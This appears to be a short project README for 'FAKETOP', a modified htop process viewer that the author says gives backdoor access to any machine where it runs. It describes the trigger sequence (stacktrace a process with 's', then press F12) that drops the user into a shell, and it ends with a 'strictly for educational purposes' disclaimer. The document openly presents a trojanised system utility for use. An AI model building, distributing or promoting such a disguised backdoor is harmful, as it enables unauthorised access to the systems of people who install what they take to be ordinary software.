## FAKETOP
This is a modified version of htop that gives us some form of backdoor access to a machine whenever it gets run. :)

When on a machine with this version of htop installed, press `s` to stacktrace any process, then press `F12`. Wait til a command prompt interrupts htop at the bottom of the screen. After that, use `/usr/bin/reset` to reset the bash shell to a proper tty.
Strictly for educational purposes only.
